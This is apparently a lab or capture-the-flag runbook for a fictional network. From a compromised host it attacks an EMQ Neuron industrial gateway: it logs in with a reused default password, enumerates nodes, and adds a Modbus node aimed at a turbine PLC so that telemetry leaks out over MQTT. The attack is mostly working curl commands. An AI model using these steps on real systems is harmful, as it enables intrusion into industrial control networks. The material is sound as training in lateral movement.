# Runbook: sorting-office

## Discovery

Port 7000 on 10.10.5.11 is not reachable from the internet zone. After gaining a shell on contractors-gate, a TCP probe
confirms it is open.

```bash
root@contractors-gate:~# nc -zv 10.10.5.11 7000
```

```bash
root@contractors-gate:~# curl -s http://10.10.5.11:7000/api/v2/ping
```

Returns `{"error":0}`. The path structure and response format match Neuron, an industrial protocol gateway from EMQ that
bridges southbound device protocols to a northbound MQTT publisher. The ping endpoint answers without a credential.

## Authentication

Neuron uses JWT tokens. The login endpoint issues them.

```bash
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/login \
    -H 'Content-Type: application/json' \
    -d '{"name":"admin","pass":"uupl2015"}'
```

```json
{
  "token": "eyJ...",
  "error": 0
}
```

The credential `admin / uupl2015` works. The password is the same one used on contractors-gate; it appears to be the
site-wide default across DMZ services. Extract the token for subsequent calls:

```bash
root@contractors-gate:~# TOKEN=$(curl -s -X POST http://10.10.5.11:7000/api/v2/login \
    -H 'Content-Type: application/json' \
    -d '{"name":"admin","pass":"uupl2015"}' \
    | sed -n 's/.*"token": *"\([^"]*\)".*/\1/p')
```

## Node enumeration

Neuron organises devices into nodes. Type 2 is northbound (data destinations, such as MQTT publishers). Type 1 is
southbound (data sources, such as Modbus devices).

```bash
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    'http://10.10.5.11:7000/api/v2/node?type=2'
```

One northbound node appears: `uupl-mqtt-north`. It publishes to clacks-relay at `10.10.5.12:1883` under the
`neuron/<sorting-office>/` topic prefix.

```bash
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    'http://10.10.5.11:7000/api/v2/node?type=1'
```

Returns `{"nodes":[]}`. No southbound device is configured by default. The northbound publisher exists but has nothing to forward yet.

## Available drivers

```bash
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    http://10.10.5.11:7000/api/v2/plugin
```

Installed driver plugins include Modbus TCP, OPC-UA, IEC-60870-5-104, and DNP3. Each one can be pointed at a device
inside a zone that is not directly reachable from the current foothold. Sorting-office may have routing paths that
contractors-gate does not.

## Adding a southbound device

The API accepts new node definitions from any machine that can reach port 7000. Pointing a Modbus node at the control
zone (10.10.3.0/24) is only meaningful if sorting-office can route there. Create a node:

```bash
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/node \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"name":"turbine-plc","plugin":"Modbus TCP"}'
```

Configure the target address:

```bash
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/node/setting \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"node":"turbine-plc","params":{"host":"10.10.3.21","port":502,"timeout":3000}}'
```

Once a register group and tags are added and the node is started, Neuron polls the PLC and `uupl-mqtt-north` forwards
readings to clacks-relay. A subscriber on port 1883 then receives live PLC telemetry without directly touching the
control zone.

## Persistence

Configuration changes made through the API persist across service restarts.

## What you can know now

Access:

- Neuron management API at `10.10.5.11:7000`, credential `admin / uupl2015`
- JWT token required for all calls beyond `/ping`

Nodes:

- Northbound: `uupl-mqtt-north`, publishing to `clacks-relay` at `10.10.5.12:1883`
- Southbound: empty by default; Modbus TCP, OPC-UA, IEC-60870-5-104, DNP3 available

Credential reuse:

- `uupl2015` is the contractors-gate root password and the Neuron admin password

## Quick reference

```
root@contractors-gate:~# curl -s http://10.10.5.11:7000/api/v2/ping              ping, no auth
root@contractors-gate:~# curl -s -X POST http://10.10.5.11:7000/api/v2/login \
    -H 'Content-Type: application/json' \
    -d '{"name":"admin","pass":"uupl2015"}'                                       get JWT
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    'http://10.10.5.11:7000/api/v2/node?type=2'                                   northbound nodes
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    'http://10.10.5.11:7000/api/v2/node?type=1'                                   southbound nodes (empty)
root@contractors-gate:~# curl -s -H "Authorization: Bearer $TOKEN" \
    http://10.10.5.11:7000/api/v2/plugin                                           driver plugins
```
